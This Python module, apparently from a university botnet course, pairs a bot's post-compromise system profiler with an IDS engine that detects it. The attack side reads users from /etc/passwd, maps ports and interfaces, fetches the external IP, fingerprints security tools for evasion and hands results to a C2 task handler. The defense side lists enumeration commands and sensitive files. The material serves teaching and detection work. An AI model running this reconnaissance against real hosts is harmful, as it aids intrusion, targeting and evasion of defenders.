"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: System Profiler (Attack + Defense)
 Environment: ISOLATED VM LAB ONLY
====================================================

Attack side:
  A bot that can gather comprehensive system information
  represents a significant intelligence gain for the botmaster —
  it allows targeting decisions (which bots to use for DDoS vs.
  cryptomining vs. lateral movement) based on hardware capability,
  OS version, and network position.

  Teaching point: system enumeration is MITRE T1082 (System
  Information Discovery) and T1016 (System Network Configuration
  Discovery). It is almost always the first step after initial
  access, before any destructive payload is deployed.

Defense side (IDS Engine 17):
  Rapid system enumeration produces detectable artifacts:
    - Burst of /proc/ reads in a very short window
    - Subprocess spawning of uname, ip, ss, id in quick succession
    - Outbound HTTP to IP-lookup services (ipify, ifconfig.me, etc.)
    - psutil process tree crawl (many /proc/[pid]/status reads)
  All of these appear in auditd or eBPF syscall traces and can be
  correlated to flag a post-compromise enumeration phase.

CLI:
  python3 system_profiler.py --collect          (bot side)
  python3 system_profiler.py --detect           (IDS demo)
  python3 system_profiler.py --ioc              (print IOCs)
  python3 system_profiler.py --demo             (full demo)
"""

import os
import sys
import time
import json
import socket
import hashlib
import platform
import subprocess
import threading
import urllib.request
import urllib.error
from datetime import datetime
from collections import defaultdict, deque

try:
    import psutil
    PSUTIL_OK = True
except ImportError:
    PSUTIL_OK = False

# ── Shared alert callback (replaced by ids_detector.alert when integrated) ─

def _default_alert(engine, severity, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"\n{'='*60}")
    print(f"  ALERT [{severity}]  {engine}  @ {ts}")
    print(f"  {msg}")
    print(f"{'='*60}\n")

_alert_fn = _default_alert

def register_alert_fn(fn):
    global _alert_fn
    _alert_fn = fn


# ════════════════════════════════════════════════════════════════
#  ATTACK SIDE: System Information Collection
#  MITRE T1082, T1016, T1033, T1007
# ════════════════════════════════════════════════════════════════

class SystemProfiler:
    """
    Comprehensive system information collector.

    What a real botnet uses this for:
      - CPU count / RAM → decide if host is suitable for cryptomining
      - OS version       → select OS-specific exploits
      - Network config   → identify subnets for lateral movement
      - Running services → find additional attack surfaces
      - User accounts    → find privileged users for targeting
      - External IP      → determine geo-region for C2 routing

    All collection is passive (read-only syscalls and /proc reads).
    No modification, no injection, no file writes.
    """

    EXTERNAL_IP_SERVICES = [
        "https://api.ipify.org?format=json",
        "https://ifconfig.me/ip",
    ]

    def collect_basic(self) -> dict:
        """OS, hostname, architecture, kernel version."""
        info = {
            "hostname":       socket.gethostname(),
            "fqdn":           socket.getfqdn(),
            "platform":       platform.system(),
            "platform_release": platform.release(),
            "platform_version": platform.version(),
            "architecture":   platform.machine(),
            "processor":      platform.processor(),
            "python_version": platform.python_version(),
            "boot_time":      None,
        }
        if PSUTIL_OK:
            info["boot_time"] = datetime.fromtimestamp(
                psutil.boot_time()).isoformat()
        return info

    def collect_hardware(self) -> dict:
        """CPU, RAM, disk — determines mining / DDoS suitability."""
        hw = {}
        if PSUTIL_OK:
            hw["cpu_physical_cores"] = psutil.cpu_count(logical=False)
            hw["cpu_logical_cores"]  = psutil.cpu_count(logical=True)
            hw["cpu_freq_mhz"]       = (
                round(psutil.cpu_freq().current, 1)
                if psutil.cpu_freq() else None
            )
            vm = psutil.virtual_memory()
            hw["ram_total_gb"]  = round(vm.total  / 2**30, 2)
            hw["ram_avail_gb"]  = round(vm.available / 2**30, 2)
            hw["ram_used_pct"]  = vm.percent
            hw["disks"] = []
            for part in psutil.disk_partitions(all=False):
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    hw["disks"].append({
                        "device":     part.device,
                        "mountpoint": part.mountpoint,
                        "fstype":     part.fstype,
                        "total_gb":   round(usage.total / 2**30, 2),
                        "free_gb":    round(usage.free  / 2**30, 2),
                    })
                except PermissionError:
                    pass
        return hw

    def collect_network(self) -> dict:
        """All interfaces, routing hints, open ports — lateral movement prep."""
        net = {"interfaces": {}, "connections": [], "external_ip": None}

        if PSUTIL_OK:
            addrs = psutil.net_if_addrs()
            stats = psutil.net_if_stats()
            for iface, addr_list in addrs.items():
                net["interfaces"][iface] = {
                    "is_up":   stats[iface].isup if iface in stats else None,
                    "speed":   stats[iface].speed if iface in stats else None,
                    "addresses": [],
                }
                for a in addr_list:
                    net["interfaces"][iface]["addresses"].append({
                        "family":  str(a.family),
                        "address": a.address,
                        "netmask": a.netmask,
                        "broadcast": a.broadcast,
                    })

            # Listening TCP/UDP ports — attack surface map
            for conn in psutil.net_connections(kind="inet"):
                if conn.status in ("LISTEN", "NONE"):
                    net["connections"].append({
                        "type":    "TCP" if conn.type.name == "SOCK_STREAM" else "UDP",
                        "laddr":   f"{conn.laddr.ip}:{conn.laddr.port}",
                        "status":  conn.status,
                        "pid":     conn.pid,
                    })

        # External IP — identifies NAT position and geo-region
        for svc in self.EXTERNAL_IP_SERVICES:
            try:
                with urllib.request.urlopen(svc, timeout=4) as r:
                    raw = r.read().decode()
                    if svc.endswith("json"):
                        net["external_ip"] = json.loads(raw).get("ip")
                    else:
                        net["external_ip"] = raw.strip()
                    break
            except Exception:
                continue

        return net

    def collect_users(self) -> list:
        """Local user accounts — credential and privilege mapping."""
        users = []
        try:
            with open("/etc/passwd") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) < 7:
                        continue
                    uid = int(parts[2])
                    # Report system users (uid < 1000) only if they have
                    # a real shell — indicates service account pivoting risk.
                    shell = parts[6]
                    is_interactive = shell not in (
                        "/bin/false", "/usr/sbin/nologin", "/sbin/nologin", ""
                    )
                    users.append({
                        "username":       parts[0],
                        "uid":            uid,
                        "gid":            int(parts[3]),
                        "home":           parts[5],
                        "shell":          shell,
                        "interactive":    is_interactive,
                        "is_system":      uid < 1000,
                        "is_root":        uid == 0,
                    })
        except FileNotFoundError:
            pass
        return users

    def collect_processes(self, top_n: int = 20) -> list:
        """Top running processes — identify security tools to avoid."""
        procs = []
        if not PSUTIL_OK:
            return procs
        for p in sorted(
            psutil.process_iter(["pid", "name", "username", "cmdline", "cpu_percent"]),
            key=lambda p: p.info.get("cpu_percent", 0) or 0,
            reverse=True
        )[:top_n]:
            try:
                procs.append({
                    "pid":      p.info["pid"],
                    "name":     p.info["name"],
                    "user":     p.info["username"],
                    "cmdline":  " ".join(p.info["cmdline"] or [])[:80],
                    "cpu_pct":  p.info["cpu_percent"],
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return procs

    def collect_security_tools(self) -> dict:
        """
        Detect installed security software.
        A bot uses this to decide whether to be more stealthy.
        Teaching point: detection evasion begins with intelligence.
        """
        results = {"running": [], "installed": []}
        SECURITY_PROCESS_NAMES = {
            "clamd", "clamav", "snort", "suricata", "ossec",
            "wazuh", "falco", "auditd", "sysdig", "zeek", "bro",
            "aide", "tripwire", "samhain", "rkhunter", "chkrootkit",
        }
        SECURITY_BINARIES = [
            "/usr/sbin/auditd",
            "/usr/bin/clamd",
            "/usr/sbin/snort",
            "/usr/bin/suricata",
            "/var/ossec/bin/ossec-control",
            "/usr/bin/falco",
        ]

        if PSUTIL_OK:
            for p in psutil.process_iter(["name"]):
                try:
                    if p.info["name"].lower() in SECURITY_PROCESS_NAMES:
                        results["running"].append(p.info["name"])
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

        for path in SECURITY_BINARIES:
            if os.path.exists(path):
                results["installed"].append(path)

        return results

    def collect_all(self) -> dict:
        """Full system profile — sent back to C2 after initial access."""
        profile = {
            "collected_at": datetime.now().isoformat(),
            "bot_id":       f"bot_{socket.gethostname()}_{os.getpid()}",
            "basic":        self.collect_basic(),
            "hardware":     self.collect_hardware(),
            "network":      self.collect_network(),
            "users":        self.collect_users(),
            "processes":    self.collect_processes(),
            "security":     self.collect_security_tools(),
        }
        return profile


# ════════════════════════════════════════════════════════════════
#  DEFENSE SIDE: System Enumeration IDS Engine
#  Detects the artifacts of post-compromise reconnaissance
# ════════════════════════════════════════════════════════════════

class SystemEnumerationDetector:
    """
    IDS Engine 17 — System Enumeration Detection.

    Monitors for the behavioral signature of post-compromise
    system reconnaissance:

      1. /proc/ burst — rapid reads of /proc/[pid]/status or
         /proc/net/tcp by a single process in a short window.
         Legitimate monitoring tools are periodic; post-compromise
         profiling is a one-shot burst.

      2. Enumeration command burst — spawning of id, whoami,
         uname, ip addr, ss, netstat, ps, cat /etc/passwd in
         quick succession from the same parent PID.

      3. External IP lookup — outbound HTTP/HTTPS to known
         IP-discovery services (ipify.org, ifconfig.me, etc.)
         by a non-browser process.

      4. /etc/passwd and /etc/shadow reads by non-root processes —
         classic UID 0 check evasion pattern.

    MITRE:
      T1082  System Information Discovery
      T1016  System Network Configuration Discovery
      T1033  System Owner/User Discovery
      T1007  System Service Discovery
      T1018  Remote System Discovery
    """

    ENUM_COMMANDS = {
        "id", "whoami", "uname", "hostname", "ip", "ifconfig",
        "netstat", "ss", "ps", "cat", "getent", "last", "w",
        "uptime", "df", "free", "lscpu", "lsblk", "lsusb",
        "dmidecode", "systemctl", "service", "crontab",
    }

    EXTERNAL_IP_DOMAINS = {
        "api.ipify.org", "ifconfig.me", "icanhazip.com",
        "checkip.amazonaws.com", "ipecho.net", "wtfismyip.com",
        "myexternalip.com", "ipinfo.io",
    }

    SENSITIVE_FILES = {
        "/etc/passwd", "/etc/shadow", "/etc/group",
        "/etc/sudoers", "/etc/crontab",
    }

    def __init__(self,
                 cmd_burst_window: float = 10.0,
                 cmd_burst_threshold: int = 6,
                 proc_burst_window: float = 5.0,
                 proc_burst_threshold: int = 50):

        self._cmd_burst_window    = cmd_burst_window
        self._cmd_burst_threshold = cmd_burst_threshold
        self._proc_burst_window   = proc_burst_window
        self._proc_burst_threshold= proc_burst_threshold

        # Per-parent-PID command spawn timestamps
        self._cmd_times: dict[int, deque] = defaultdict(lambda: deque())
        self._cmd_lock = threading.Lock()

        # External IP lookup event timestamps
        self._extip_times: deque = deque()
        self._extip_lock = threading.Lock()

        # /proc/ burst tracking (requires eBPF / auditd; simulated here)
        self._proc_reads: dict[int, deque] = defaultdict(lambda: deque())

        # Alert cooldown
        self._last_alert: dict[str, float] = {}
        self._cooldown = 120.0

    def _cooldown_ok(self, key: str) -> bool:
        now = time.time()
        if now - self._last_alert.get(key, 0) >= self._cooldown:
            self._last_alert[key] = now
            return True
        return False

    def observe_subprocess(self, parent_pid: int, child_name: str,
                           child_cmdline: str = ""):
        """
        Called when a subprocess is spawned.
        Feed from auditd execve events or psutil process creation monitoring.
        """
        cmd_base = os.path.basename(child_name).lower().split()[0]
        if cmd_base not in self.ENUM_COMMANDS:
            return

        now = time.time()
        with self._cmd_lock:
            q = self._cmd_times[parent_pid]
            q.append((now, cmd_base))
            # Trim old entries
            while q and q[0][0] < now - self._cmd_burst_window:
                q.popleft()

            count = len(q)
            if count >= self._cmd_burst_threshold:
                if self._cooldown_ok(f"cmdburst_{parent_pid}"):
                    cmds = [c for _, c in q]
                    _alert_fn(
                        "SysEnum/CommandBurst", "HIGH",
                        f"SYSTEM ENUMERATION BURST: parent PID={parent_pid}\n"
                        f"  {count} enumeration commands in {self._cmd_burst_window}s\n"
                        f"  Commands: {', '.join(cmds)}\n"
                        f"  Pattern: post-compromise system reconnaissance\n"
                        f"  MITRE: T1082/T1016/T1033/T1007"
                    )

    def observe_network_request(self, dest_hostname: str,
                                src_process: str = "unknown"):
        """
        Called when an outbound HTTP/HTTPS request is detected.
        Feed from DPI engine or proxy logs.
        """
        if dest_hostname.lower() not in self.EXTERNAL_IP_DOMAINS:
            return

        now = time.time()
        with self._extip_lock:
            self._extip_times.append(now)
            while self._extip_times and \
                    self._extip_times[0] < now - 60.0:
                self._extip_times.popleft()

        if self._cooldown_ok(f"extip_{dest_hostname}"):
            _alert_fn(
                "SysEnum/ExternalIPLookup", "MED",
                f"EXTERNAL IP LOOKUP from non-browser process: {src_process}\n"
                f"  Destination: {dest_hostname}\n"
                f"  Post-compromise bots query these services to determine\n"
                f"  their public IP for C2 registration and geo-routing.\n"
                f"  MITRE: T1016 (System Network Configuration Discovery)"
            )

    def observe_file_read(self, path: str, reader_uid: int,
                          reader_process: str = "unknown"):
        """
        Called when a sensitive file is read.
        Feed from auditd open/read events.
        """
        if path not in self.SENSITIVE_FILES:
            return

        # /etc/shadow readable only by root; any non-root read is suspicious.
        # /etc/passwd is world-readable, but rapid reads from a non-sysadmin
        # process indicate enumeration.
        is_shadow = "shadow" in path or "sudoers" in path
        severity = "HIGH" if (is_shadow and reader_uid != 0) else "MED"

        if self._cooldown_ok(f"file_{path}_{reader_process}"):
            _alert_fn(
                "SysEnum/SensitiveFileRead", severity,
                f"SENSITIVE FILE READ: {path}\n"
                f"  Reader: {reader_process}  UID={reader_uid}\n"
                f"  Legitimate tools rarely read {path} outside init or admin tasks.\n"
                f"  Post-compromise bots read passwd to map users for pivoting.\n"
                f"  MITRE: T1033 (System Owner/User Discovery)"
            )

    def scan_running_processes(self):
        """
        Active scan: detect enumeration happening right now.
        Looks for short-lived processes that match the enumeration pattern.
        Run periodically from a background thread.
        """
        if not PSUTIL_OK:
            return

        suspicious_parents: dict[int, list] = defaultdict(list)
        now = time.time()

        for p in psutil.process_iter(["pid", "ppid", "name", "create_time",
                                       "cmdline"]):
            try:
                age = now - p.info["create_time"]
                if age > 30:  # Only recently created processes
                    continue
                name = (p.info["name"] or "").lower()
                if name in self.ENUM_COMMANDS:
                    suspicious_parents[p.info["ppid"]].append(name)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

        for ppid, cmds in suspicious_parents.items():
            if len(cmds) >= 3:
                if self._cooldown_ok(f"scan_ppid_{ppid}"):
                    _alert_fn(
                        "SysEnum/ActiveScan", "HIGH",
                        f"ACTIVE SYSTEM ENUMERATION DETECTED: parent PID={ppid}\n"
                        f"  Short-lived enumeration processes: {', '.join(cmds)}\n"
                        f"  {len(cmds)} tool invocations within 30s of each other\n"
                        f"  MITRE: T1082 (System Information Discovery)"
                    )

    def start_background_monitor(self, interval: float = 15.0):
        """Start periodic active scanning in a daemon thread."""
        def _loop():
            while True:
                try:
                    self.scan_running_processes()
                except Exception as e:
                    print(f"[SysEnum] Monitor error: {e}")
                time.sleep(interval)

        t = threading.Thread(target=_loop, daemon=True,
                             name="sysenum-monitor")
        t.start()
        print(f"[IDS-E17] System enumeration detector started "
              f"(scan every {interval}s)")
        return t


# ── Global detector singleton for IDS integration ─────────────
_detector = SystemEnumerationDetector()

def get_detector() -> SystemEnumerationDetector:
    return _detector


# ── C2 task handler integration ───────────────────────────────
# Add this to bot_agent.c2 task dispatcher:
#
#   "system_profile" task type:
#     profiler = SystemProfiler()
#     profile  = profiler.collect_all()
#     send_result_to_c2(profile)
#
# And in c2_server.py task types, add:
#   "system_profile" — triggers full system enumeration

def handle_task(task: dict) -> dict:
    """Handle a 'system_profile' task from the C2 server."""
    if task.get("type") != "system_profile":
        return {"error": "wrong task type"}
    profiler = SystemProfiler()
    profile = profiler.collect_all()
    return {"status": "ok", "profile": profile}


# ════════════════════════════════════════════════════════════════
#  IOC REFERENCE
# ════════════════════════════════════════════════════════════════

IOC_LIST = {
    "description": "System enumeration IOCs for defensive integration",
    "network_iocs": {
        "external_ip_domains": list(SystemEnumerationDetector.EXTERNAL_IP_DOMAINS),
        "alert": "Outbound request to IP-lookup service from non-browser process",
    },
    "process_iocs": {
        "burst_pattern": ">= 6 enumeration commands from same parent PID in 10s",
        "commands": sorted(SystemEnumerationDetector.ENUM_COMMANDS),
    },
    "file_iocs": {
        "sensitive_reads": sorted(SystemEnumerationDetector.SENSITIVE_FILES),
        "alert": "Read by unexpected UID or process",
    },
    "mitre_ttps": [
        "T1082 - System Information Discovery",
        "T1016 - System Network Configuration Discovery",
        "T1033 - System Owner/User Discovery",
        "T1007 - System Service Discovery",
        "T1018 - Remote System Discovery",
    ],
}


# ════════════════════════════════════════════════════════════════
#  CLI
# ════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(
        description="System Profiler — Attack + Defense Research Module")
    parser.add_argument("--collect", action="store_true",
                        help="Run full system profile collection (bot side)")
    parser.add_argument("--detect", action="store_true",
                        help="Run enumeration detector demo")
    parser.add_argument("--ioc", action="store_true",
                        help="Print IOC reference list")
    parser.add_argument("--demo", action="store_true",
                        help="Full attack+defense demo")
    args = parser.parse_args()

    if args.ioc or args.demo:
        print(json.dumps(IOC_LIST, indent=2))

    if args.collect or args.demo:
        print("\n[SYSTEM_PROFILER] Collecting system profile...")
        p = SystemProfiler()
        profile = p.collect_all()
        print(json.dumps(profile, indent=2, default=str))

    if args.detect or args.demo:
        print("\n[IDS-E17] Starting enumeration detection demo...")
        det = SystemEnumerationDetector()

        # Simulate a burst of enumeration commands from same parent
        print("[IDS-E17] Simulating command burst from PID 1337...")
        for cmd in ["id", "whoami", "uname", "ip", "ss", "cat", "ps"]:
            det.observe_subprocess(1337, cmd)
            time.sleep(0.1)

        # Simulate external IP lookup
        print("[IDS-E17] Simulating external IP lookup...")
        det.observe_network_request("api.ipify.org", "python3")

        # Simulate sensitive file read
        print("[IDS-E17] Simulating /etc/passwd read...")
        det.observe_file_read("/etc/passwd", reader_uid=1000,
                              reader_process="malware_bot")

        print("[IDS-E17] Demo complete.")
